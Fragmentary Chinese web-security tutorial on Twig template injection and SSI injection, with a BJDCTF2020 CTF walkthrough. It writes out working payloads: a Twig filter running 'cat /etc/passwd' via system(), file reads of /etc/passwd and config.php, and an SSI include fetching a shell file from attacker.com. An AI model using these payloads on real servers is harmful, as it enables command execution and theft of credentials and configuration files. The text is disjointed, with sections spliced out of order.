...
**使用registerUndefinedFilterCallback：**
...
{{ ["cat /etc/passwd", 0]|sort("system")|join }}
```
{% endraw %}
...
{% raw %}
```twig
{{ '/etc/passwd'|file_excerpt(1, 30) }}           {# 从第1行开始读取30行 #}
{{ '/var/www/html/config.php'|file_excerpt(1, 50) }}
```
{% endraw %}
...
{% raw %}
```twig
{{ app.request.files.get(1).getPathname() }}
{{ app.request.files.get(1).getRealPath() }}
```
{% endraw %}
...
**SSI（Server-Side Includes，服务器端包含）** 是一种由Web服务器（如Apache、Nginx）提供的功能，允许在HTML页面中嵌入动态内容。SSI注入（Server-Side Includes Injection）是一种Web安全漏洞，攻击者能够在服务器端注入恶意SSI指令，导致服务器执行任意命令、读取敏感文件或执行其他恶意操作。
...
Server: Apache/2.4.41 (Unix) mod_include
```
...
<!--#include virtual="http://attacker.com/shell.txt" -->
```
...
当用户输入被直接反射到页面且服务器启用SSI时：

```html
<!-- 存在漏洞的代码 -->
<p>Welcome, <!--#echo var="USERNAME" --></p>
```
...
### BJDCTF2020 EasySearch案例分析

#### 题目背景

这是一道CTF题目，涉及SSI注入漏洞的利用。

#### 解题步骤

**步骤1：信息收集**

访问首页，审查源代码、抓包未获取到有效信息。

**步骤2：目录扫描**

使用目录扫描工具发现 `index.php.swp` 文件（Vim交换文件）。

**步骤3：获取源代码**

访问 `index.php.swp` 获取源代码：

```php
<?php
// 简化的漏洞代码逻辑
$password = $_POST['password'];
// 检查密码MD5值前6位是否为'6d0bc1'
if (substr(md5($password), 0, 6) === '6d0bc1') {
    // 登录成功，显示欢迎信息
...
需要找到MD5值前6位为 `6d0bc1` 的字符串。使用Python脚本爆破：
...
找到的可用值：`2020666`（MD5: 6d0bc1...）

**步骤5：登录并发现注入点**

使用密码 `2020666` 登录，发现用户名参数可控且存在SSI注入。
...
$username = sanitizeSSI($_POST['username']);
?>
```
...
避免使用 `.shtml`、`.shtm`、`.stm` 等SSI启用的扩展名。
...
{{ _self.env.enableDebug() }}{{ _self.env.isDebug() }}  {# 启用并检查调试模式 #}
```
{% endraw %}
